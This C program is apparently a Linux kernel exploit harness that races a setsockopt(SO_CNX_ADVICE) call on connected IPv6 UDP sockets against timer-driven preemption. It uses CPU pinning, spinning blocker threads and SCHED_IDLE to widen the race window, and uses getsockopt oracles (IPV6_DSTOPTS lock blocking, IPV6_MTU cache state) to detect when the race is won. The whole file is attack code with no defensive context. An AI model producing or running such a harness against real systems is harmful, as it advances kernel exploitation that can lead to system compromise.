#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/poll.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SO_CNX_ADVICE
#define SO_CNX_ADVICE 53
#endif

#ifndef MSG_PROBE
#define MSG_PROBE 0x10
#endif

typedef uint8_t u8;
typedef uint64_t u64;
typedef size_t usize;

#define LOG(fmt, ...)                                                           \
    do {                                                                        \
        printf(fmt "\n", ##__VA_ARGS__);                                       \
        fflush(stdout);                                                         \
    } while (0)

#define SYSCHK(x)                                                               \
    ({                                                                          \
        __typeof__(x) __res = (x);                                              \
        if (__res == (__typeof__(x))-1) {                                       \
            int __err = errno;                                                  \
            fprintf(stderr, "SYSCHK(%s) failed: errno=%d (%s)\n", #x, __err,    \
                    strerror(__err));                                           \
            exit(1);                                                            \
        }                                                                       \
        __res;                                                                  \
    })

typedef enum {
    LOCK_ORACLE_RETURNED = 0,
    LOCK_ORACLE_BLOCKED = 1,
    LOCK_ORACLE_FORK_FAILED = 2,
} LockOracleState;

typedef struct {
    LockOracleState state;
    int child_errno;
    int child_status;
    pid_t pid;
} LockOracleResult;

typedef enum {
    CACHE_ORACLE_ERR = -1,
    CACHE_ORACLE_NULL = 0,
    CACHE_ORACLE_VISIBLE = 1,
} CacheOracleState;

typedef struct {
    CacheOracleState state;
    int mtu;
    int err;
} CacheOracleResult;

typedef struct {
    atomic_int ready_count;
    atomic_int trigger_tid;
    atomic_int trigger_done;
    atomic_int trigger_ret;
    atomic_int trigger_errno;
    atomic_int vuln_socket;
    int timer_fd;
    int sync_pipe[2];
    u64 timer_offset_ns;
    usize align_pad;
    int trigger_cpu;
    bool use_sched_idle;
} TriggerCtx;

typedef struct {
    int cpu;
    atomic_int *ready_count;
} BlockerArg;

static u64 now_ns(void) {
    struct timespec ts;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
    return (u64)ts.tv_sec * 1000000000ull + (u64)ts.tv_nsec;
}

static struct timespec ns_to_timespec(u64 ns) {
    struct timespec ts;
    ts.tv_sec = (time_t)(ns / 1000000000ull);
    ts.tv_nsec = (long)(ns % 1000000000ull);
    return ts;
}

static u64 env_u64(const char *name, u64 fallback) {
    const char *value = getenv(name);
    if (!value || !*value)
        return fallback;
    errno = 0;
    char *end = NULL;
    unsigned long long parsed = strtoull(value, &end, 0);
    if (errno || end == value)
        return fallback;
    return (u64)parsed;
}

static const char *env_str(const char *name, const char *fallback) {
    const char *value = getenv(name);
    return (value && *value) ? value : fallback;
}

static int online_cpus(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    return n > 0 ? (int)n : 1;
}

static int pin_thread_to_cpu(pid_t tid, int cpu) {
    int ncpu = online_cpus();
    if (cpu < 0 || cpu >= ncpu)
        return -1;

    cpu_set_t *set = CPU_ALLOC(ncpu);
    if (!set)
        return -1;
    size_t set_size = CPU_ALLOC_SIZE(ncpu);
    CPU_ZERO_S(set_size, set);
    CPU_SET_S(cpu, set_size, set);
    int rc = sched_setaffinity(tid, set_size, set);
    CPU_FREE(set);
    return rc;
}

static int pin_self_to_cpu(int cpu) {
    return pin_thread_to_cpu(0, cpu);
}

static void make_self_sched_idle(void) {
    struct sched_param param;
    memset(&param, 0, sizeof(param));
    if (sched_setscheduler(0, SCHED_IDLE, &param) != 0)
        LOG("warn: sched_setscheduler(SCHED_IDLE) failed errno=%d", errno);
}

static void set_file_limit(rlim_t limit) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0)
        return;
    if (rl.rlim_max < limit)
        rl.rlim_max = limit;
    rl.rlim_cur = limit < rl.rlim_max ? limit : rl.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0)
        LOG("warn: setrlimit(RLIMIT_NOFILE) failed errno=%d", errno);
}

static int open_connected_ipv6_udp_socket(const char *addr_string, int port) {
    int fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));

    struct sockaddr_in6 addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons((uint16_t)port);
    if (inet_pton(AF_INET6, addr_string, &addr.sin6_addr) != 1) {
        LOG("bad IPv6 address: %s", addr_string);
        exit(1);
    }

    SYSCHK(connect(fd, (struct sockaddr *)&addr, sizeof(addr)));
    return fd;
}

static CacheOracleResult run_ipv6_mtu_cache_oracle(int fd) {
    CacheOracleResult result = {
        .state = CACHE_ORACLE_ERR,
        .mtu = -1,
        .err = 0,
    };
    int mtu = 0;
    socklen_t mtu_len = sizeof(mtu);

    if (getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == 0) {
        result.state = CACHE_ORACLE_VISIBLE;
        result.mtu = mtu;
        return result;
    }

    result.err = errno;
    if (errno == ENOTCONN)
        result.state = CACHE_ORACLE_NULL;
    return result;
}

static const char *cache_state_name(CacheOracleState state) {
    switch (state) {
    case CACHE_ORACLE_VISIBLE:
        return "visible";
    case CACHE_ORACLE_NULL:
        return "null";
    default:
        return "error";
    }
}

static LockOracleResult run_ipv6_dstopts_lock_oracle(int fd, u64 timeout_us) {
    LockOracleResult result = {
        .state = LOCK_ORACLE_FORK_FAILED,
        .child_errno = 0,
        .child_status = 0,
        .pid = -1,
    };

    int err_pipe[2];
    if (pipe(err_pipe) != 0)
        return result;

    pid_t pid = fork();
    if (pid < 0) {
        close(err_pipe[0]);
        close(err_pipe[1]);
        return result;
    }

    if (pid == 0) {
        close(err_pipe[0]);
        u8 control[256];
        memset(control, 0, sizeof(control));
        socklen_t len = sizeof(control);
        int rc = getsockopt(fd, SOL_IPV6, IPV6_DSTOPTS, control, &len);
        int err = rc == 0 ? 0 : errno;
        (void)write(err_pipe[1], &err, sizeof(err));
        _exit(rc == 0 ? 0 : 1);
    }

    close(err_pipe[1]);
    result.pid = pid;

    u64 start = now_ns();
    for (;;) {
        int status = 0;
        pid_t got = waitpid(pid, &status, WNOHANG);
        if (got == pid) {
            result.state = LOCK_ORACLE_RETURNED;
            result.child_status = status;
            int child_errno = 0;
            (void)read(err_pipe[0], &child_errno, sizeof(child_errno));
            result.child_errno = child_errno;
            close(err_pipe[0]);
            return result;
        }
        if (got < 0 && errno != EINTR) {
            result.state = LOCK_ORACLE_RETURNED;
            result.child_errno = errno;
            close(err_pipe[0]);
            return result;
        }
        if ((now_ns() - start) >= timeout_us * 1000ull) {
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            result.state = LOCK_ORACLE_BLOCKED;
            result.child_status = status;
            close(err_pipe[0]);
            return result;
        }
        usleep(50);
    }
}

static const char *lock_state_name(LockOracleState state) {
    switch (state) {
    case LOCK_ORACLE_BLOCKED:
        return "blocked";
    case LOCK_ORACLE_RETURNED:
        return "returned";
    default:
        return "fork_failed";
    }
}

static bool wait_timerfd(int timer_fd, u64 timeout_us, u64 *overruns) {
    struct pollfd pfd = {
        .fd = timer_fd,
        .events = POLLIN,
    };
    int rc = poll(&pfd, 1, (int)((timeout_us + 999) / 1000));
    if (rc <= 0)
        return false;
    if (!(pfd.revents & POLLIN))
        return false;
    return read(timer_fd, overruns, sizeof(*overruns)) == (ssize_t)sizeof(*overruns);
}

static void release_trigger_to_cpu(TriggerCtx *ctx, u64 timeout_us) {
    int tid = atomic_load(&ctx->trigger_tid);
    if (tid > 0)
        (void)pin_thread_to_cpu(tid, ctx->trigger_cpu);

    u64 start = now_ns();
    while (!atomic_load(&ctx->trigger_done)) {
        if ((now_ns() - start) >= timeout_us * 1000ull)
            break;
        usleep(100);
    }
}

static void *blocker_thread(void *arg) {
    BlockerArg *blocker = (BlockerArg *)arg;
    if (blocker->cpu >= 0)
        (void)pin_self_to_cpu(blocker->cpu);
    atomic_fetch_add(blocker->ready_count, 1);

    volatile u64 sink = 0;
    for (;;) {
        sink++;
        asm volatile("" ::"r"(sink) : "memory");
    }
    return NULL;
}

static void *trigger_thread(void *arg) {
    TriggerCtx *ctx = (TriggerCtx *)arg;
    atomic_store(&ctx->trigger_tid, (int)syscall(SYS_gettid));

    if (ctx->trigger_cpu >= 0)
        (void)pin_self_to_cpu(ctx->trigger_cpu);
    if (ctx->use_sched_idle)
        make_self_sched_idle();

    atomic_fetch_add(&ctx->ready_count, 1);

    for (;;) {
        u8 byte = 0;
        ssize_t n = read(ctx->sync_pipe[0], &byte, sizeof(byte));
        if (n <= 0)
            continue;

        for (usize i = 0; i < ctx->align_pad; i++)
            asm volatile("" ::: "memory");

        atomic_store(&ctx->trigger_done, 0);
        atomic_store(&ctx->trigger_ret, 0);
        atomic_store(&ctx->trigger_errno, 0);

        int fd = atomic_load(&ctx->vuln_socket);
        struct itimerspec spec;
        memset(&spec, 0, sizeof(spec));
        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset_ns);
        if (timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL) != 0) {
            atomic_store(&ctx->trigger_ret, -1);
            atomic_store(&ctx->trigger_errno, errno);
            atomic_store(&ctx->trigger_done, 1);
            continue;
        }

        int one = 1;
        int rc = setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
        atomic_store(&ctx->trigger_ret, rc);
        atomic_store(&ctx->trigger_errno, rc == 0 ? 0 : errno);
        atomic_store(&ctx->trigger_done, 1);
    }
    return NULL;
}

static void optional_msg_probe_oracle(int fd) {
    u8 byte = 0;
    int rc = send(fd, &byte, 0, MSG_CONFIRM | MSG_PROBE);
    LOG("msg_probe_oracle rc=%d errno=%d", rc, rc == -1 ? errno : 0);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    set_file_limit((rlim_t)env_u64("IPV6_RACE_NOFILE", 32768));

    const char *target_addr = env_str("IPV6_RACE_ADDR", "::1");
    int target_port = (int)env_u64("IPV6_RACE_PORT", 1337);
    int trigger_cpu = (int)env_u64("IPV6_RACE_TRIGGER_CPU", 0);
    int freeze_cpu = (int)env_u64("IPV6_RACE_FREEZE_CPU", online_cpus() > 1 ? 1 : 0);
    usize blocker_count = (usize)env_u64("IPV6_RACE_BLOCKERS", online_cpus() > 1 ? 2 : 0);
    u64 attempts = env_u64("IPV6_RACE_MAX_ATTEMPTS", 1000);
    u64 timer_start_ns = env_u64("IPV6_RACE_TIMER_START_NS", 20000);
    u64 timer_step_ns = env_u64("IPV6_RACE_TIMER_STEP_NS", 250);
    u64 timer_sweep_count = env_u64("IPV6_RACE_TIMER_SWEEP_COUNT", 256);
    u64 lock_timeout_us = env_u64("IPV6_RACE_LOCK_ORACLE_US", 20000);
    u64 timer_read_timeout_us = env_u64("IPV6_RACE_TIMER_READ_TIMEOUT_US", 200000);
    u64 release_timeout_us = env_u64("IPV6_RACE_RELEASE_TIMEOUT_US", 200000);
    u64 settle_us = env_u64("IPV6_RACE_SETTLE_US", 0);
    usize align_sweep = (usize)env_u64("IPV6_RACE_ALIGN_SWEEP", 1);
    bool use_sched_idle = env_u64("IPV6_RACE_SCHED_IDLE", 1) != 0;
    bool use_msg_probe = env_u64("IPV6_RACE_MSG_PROBE_ORACLE", 0) != 0;

    LOG("ipv6 race harness start addr=%s port=%d cpus=%d trigger_cpu=%d freeze_cpu=%d blockers=%lu",
        target_addr, target_port, online_cpus(), trigger_cpu, freeze_cpu,
        blocker_count);
    LOG("timing start=%lu step=%lu sweep=%lu attempts=%lu lock_timeout_us=%lu",
        timer_start_ns, timer_step_ns, timer_sweep_count, attempts,
        lock_timeout_us);

    (void)pin_self_to_cpu(trigger_cpu);

    TriggerCtx ctx;
    memset(&ctx, 0, sizeof(ctx));
    atomic_init(&ctx.ready_count, 0);
    atomic_init(&ctx.trigger_tid, 0);
    atomic_init(&ctx.trigger_done, 1);
    atomic_init(&ctx.trigger_ret, 0);
    atomic_init(&ctx.trigger_errno, 0);
    atomic_init(&ctx.vuln_socket, -1);
    ctx.timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC));
    SYSCHK(pipe(ctx.sync_pipe));
    ctx.trigger_cpu = trigger_cpu;
    ctx.use_sched_idle = use_sched_idle;

    pthread_t *blockers = NULL;
    BlockerArg *blocker_args = NULL;
    if (blocker_count) {
        blockers = calloc(blocker_count, sizeof(*blockers));
        blocker_args = calloc(blocker_count, sizeof(*blocker_args));
        if (!blockers || !blocker_args)
            SYSCHK(-1);
        for (usize i = 0; i < blocker_count; i++) {
            blocker_args[i].cpu = freeze_cpu;
            blocker_args[i].ready_count = &ctx.ready_count;
            SYSCHK(pthread_create(&blockers[i], NULL, blocker_thread,
                                  &blocker_args[i]));
        }
    }

    pthread_t trigger;
    SYSCHK(pthread_create(&trigger, NULL, trigger_thread, &ctx));

    int expected_ready = 1 + (int)blocker_count;
    while (atomic_load(&ctx.ready_count) < expected_ready)
        usleep(1000);
    while (atomic_load(&ctx.trigger_tid) == 0)
        usleep(1000);

    u64 lock_blocked = 0;
    u64 lock_visible = 0;
    u64 lock_null = 0;
    u64 late = 0;
    u64 timer_miss = 0;

    for (u64 attempt = 0; attempt < attempts; attempt++) {
        u64 sweep_index = timer_sweep_count ? attempt % timer_sweep_count : 0;
        ctx.timer_offset_ns = timer_start_ns + sweep_index * timer_step_ns;
        ctx.align_pad = align_sweep ? (usize)(attempt % align_sweep) : 0;

        int fd = open_connected_ipv6_udp_socket(target_addr, target_port);
        atomic_store(&ctx.vuln_socket, fd);

        CacheOracleResult before = run_ipv6_mtu_cache_oracle(fd);
        if (before.state != CACHE_ORACLE_VISIBLE) {
            LOG("attempt=%lu setup cache_oracle=%s err=%d; retry",
                attempt, cache_state_name(before.state), before.err);
            close(fd);
            continue;
        }

        u8 byte = 0;
        SYSCHK(write(ctx.sync_pipe[1], &byte, sizeof(byte)));

        u64 overruns = 0;
        if (!wait_timerfd(ctx.timer_fd, timer_read_timeout_us, &overruns)) {
            timer_miss++;
            LOG("attempt=%lu timer_timeout offset=%lu align=%lu",
                attempt, ctx.timer_offset_ns, ctx.align_pad);
            release_trigger_to_cpu(&ctx, release_timeout_us);
            close(fd);
            continue;
        }

        int trigger_tid = atomic_load(&ctx.trigger_tid);
        if (trigger_tid > 0)
            (void)pin_thread_to_cpu(trigger_tid, freeze_cpu);
        if (settle_us)
            usleep((useconds_t)settle_us);

        bool done_at_oracle = atomic_load(&ctx.trigger_done) != 0;
        LockOracleResult lock = run_ipv6_dstopts_lock_oracle(fd, lock_timeout_us);
        CacheOracleResult cache = run_ipv6_mtu_cache_oracle(fd);

        if (use_msg_probe && lock.state == LOCK_ORACLE_BLOCKED)
            optional_msg_probe_oracle(fd);

        int trigger_ret = atomic_load(&ctx.trigger_ret);
        int trigger_errno = atomic_load(&ctx.trigger_errno);

        if (done_at_oracle)
            late++;
        if (lock.state == LOCK_ORACLE_BLOCKED) {
            lock_blocked++;
            if (cache.state == CACHE_ORACLE_VISIBLE)
                lock_visible++;
            else if (cache.state == CACHE_ORACLE_NULL)
                lock_null++;
        }

        LOG("attempt=%lu offset=%lu align=%lu timer_overruns=%lu done=%d lock=%s cache=%s mtu=%d cache_errno=%d trigger_ret=%d trigger_errno=%d stats_blocked=%lu visible=%lu null=%lu late=%lu timer_miss=%lu",
            attempt, ctx.timer_offset_ns, ctx.align_pad, overruns,
            done_at_oracle ? 1 : 0, lock_state_name(lock.state),
            cache_state_name(cache.state), cache.mtu, cache.err, trigger_ret,
            trigger_errno, lock_blocked, lock_visible, lock_null, late,
            timer_miss);

        release_trigger_to_cpu(&ctx, release_timeout_us);
        close(fd);
    }

    LOG("done attempts=%lu lock_blocked=%lu lock_visible=%lu lock_null=%lu late=%lu timer_miss=%lu",
        attempts, lock_blocked, lock_visible, lock_null, late, timer_miss);

    return 0;
}
